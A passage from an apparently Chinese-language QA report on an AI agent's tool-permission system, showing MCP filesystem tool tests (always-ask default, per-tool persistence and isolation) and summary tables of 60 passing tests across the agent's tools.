Agent: 允许访问的目录是：/private/tmp/nexau_perm_test/workspace
```

**权限弹窗**: 有（MCP server 配置 `permissions:{allow:[], deny:[]}` → always-ask） | **结果**: PASS

### T12.2 MCP list_allowed_directories 再次 — tool 级 allow 持久化

```
You: 再次用 mcp__filesystem__list_allowed_directories 工具查看允许的目录
Agent: 允许访问的目录是：/private/tmp/nexau_perm_test/workspace
```

**权限弹窗**: 无（T12.1 的 allow 持久化到 DB，permission_key=`mcp__filesystem__list_allowed_directories`，自动放行） | **结果**: PASS

### T12.3 MCP directory_tree — 不同 MCP 工具 → ask（tool 级隔离）

```
You: 用 mcp__filesystem__directory_tree 工具查看 /private/tmp/nexau_perm_test/workspace 的目录树

⚠ Permission required!
  Tool:   mcp__filesystem__directory_tree
  Prompt: 允许调用 MCP 工具 mcp__filesystem__directory_tree 吗?
  → allow / allow_once / deny: allow
  ✓ Resolved: allow

Agent: 目录树如下：
- GEMINI.md
- hello.py
- out.txt
- secret.txt
- setup.txt
- src/
  - main.py
```

**权限弹窗**: 有（`mcp__filesystem__directory_tree` 与 `list_allowed_directories` 是不同 tool_key，allow 不跨工具泄露）。allow 后工具成功执行并返回目录树。 | **结果**: PASS

### T12.4 MCP directory_tree 再次 — 同工具 allow 持久化

```
You: 再次用 mcp__filesystem__directory_tree 查看 /private/tmp/nexau_perm_test/workspace
Agent: 目录树如下：
- GEMINI.md
- hello.py
- out.txt
- secret.txt
- setup.txt
- src/
  - main.py
```

**权限弹窗**: 无（`mcp__filesystem__directory_tree` 已从 T12.3 持久化，自动放行，工具成功执行） | **结果**: PASS

### T12.5 MCP search_files — 第三个工具 → ask（allow 不跨工具泄露）

```
You: 用 mcp__filesystem__search_files 在 /private/tmp/nexau_perm_test/workspace 搜索 hello

⚠ Permission required!
  Tool:   mcp__filesystem__search_files
  Prompt: 允许调用 MCP 工具 mcp__filesystem__search_files 吗?
  → allow / allow_once / deny: deny
  ✓ Resolved: deny

Agent: 搜索失败：Permission denied by user
```

**权限弹窗**: 有（第三个 MCP 工具，前两个工具的 allow 未泄露到 `search_files`） | **结果**: PASS

**Phase 12 小结**: 5/5 PASS。MCP 工具权限三大行为全部验证：
1. **always-ask 默认**: MCP 工具首次调用必须经过用户确认（`check_mcp_permission` 无 allow 匹配 → AskPermission）
2. **tool 级持久化**: allow 后同一 MCP 工具再次调用自动放行（permission_key `mcp__{server}__{tool}` 持久化到 DB）
3. **tool 级隔离**: 同 server 下不同工具的 allow 互不影响（`mcp__filesystem__list_allowed_directories` 的 allow 不覆盖 `mcp__filesystem__directory_tree`）
4. **allow 后工具成功执行**: T12.3/T12.4 `directory_tree` allow 后正确返回目录树内容（修复前因 macOS `/tmp`→`/private/tmp` 符号链接导致 MCP server 路径校验失败）
---

## 总结


| Phase | Session | 测试数 | PASS | 备注                                              |
| ----- | ------- | --- | ---- | ----------------------------------------------- |
| 1     | A       | 7   | 7/7  | 只读工具全部自动放行                                      |
| 2     | B       | 6   | 6/6  | 文件写入工具首次 ask，目录级持久化（T2.2 独立验证），各工具独立            |
| 3     | C       | 9   | 9/9  | Shell readonly 白名单，命令级持久化，管道/链式检查               |
| 4     | D       | 3   | 3/3  | Web fetch 域名级权限，同域持久化，跨域独立                      |
| 5     | E       | 2   | 2/2  | run_code_tool ask + allow 持久化                   |
| 6     | F       | 4   | 4/4  | allow_once 非持久化（直接验证），allow 持久化                  |
| 7+8   | G       | 5   | 5/5  | 并行工具混合弹窗，session 工具自动放行                         |
| 9     | H       | 7   | 7/7  | Protected path 强制 ask，deny 不持久化，allow_once 不持久化 |
| 10    | I       | 7   | 7/7  | 输出重定向、bash -c 递归、包装器剥离、子命令粒度、ask_user           |
| 11    | J       | 5   | 5/5  | Git readonly+redirect、deny 子命令隔离、allow 子命令持久化   |
| 12    | K       | 5   | 5/5  | MCP 工具 always-ask、tool 级持久化、tool 级隔离            |


**总计: 60 项测试，60/60 PASS**

### 覆盖的 19 个 YAML 工具


| 工具                   | 权限类型                       | 测试覆盖                                    |
| -------------------- | -------------------------- | --------------------------------------- |
| read_file            | 无 permissions (auto-allow) | T1.6                                    |
| read_many_files      | 无 permissions (auto-allow) | T1.4                                    |
| read_visual_file     | 无 permissions (auto-allow) | T1.5                                    |
| glob                 | 无 permissions (auto-allow) | T1.2                                    |
| list_directory       | 无 permissions (auto-allow) | T1.1                                    |
| search_file_content  | 无 permissions (auto-allow) | T1.3                                    |
| web_search           | 无 permissions (auto-allow) | T1.7                                    |
| write_file           | path-level ask             | T2.1, T2.2, T2.6, T9.1-T9.3             |
| replace              | path-level ask             | T2.3                                    |
| apply_patch          | path-level ask             | T2.4                                    |
| multiedit_tool       | path-level ask             | T2.5                                    |
| run_shell_command    | whitelist + command-level  | T3.1-T3.9, T6.2, T9.4-T9.5, T10.1-T10.5, T11.1-T11.5 |
| BackgroundTaskManage | 无 permissions (auto-allow) | T3.7                                    |
| run_code_tool        | always ask                 | T5.1, T5.2, T9.6-T9.7                   |
| web_fetch            | domain-level ask           | T4.1-T4.3, T6.1                         |
| save_memory          | 无 permissions (auto-allow) | T8.2                                    |
| write_todos          | 无 permissions (auto-allow) | T8.1                                    |
| complete_task        | 无 permissions (auto-allow) | T8.3                                    |
| ask_user             | 无 permissions (auto-allow) | T8.4, T10.6                             |

### 覆盖的 MCP 工具（Phase 12, `@modelcontextprotocol/server-filesystem`）

| MCP 工具 | 权限类型 | 测试覆盖 |
|----------|----------|----------|
| mcp__filesystem__list_allowed_directories | always-ask (MCP default) | T12.1, T12.2 |
| mcp__filesystem__directory_tree | always-ask (MCP default) | T12.3, T12.4 |
| mcp__filesystem__search_files | always-ask (MCP default) | T12.5 |

T8.4 和 T10.6 均通过明确指令成功触发 ask_user 工具并确认自动放行。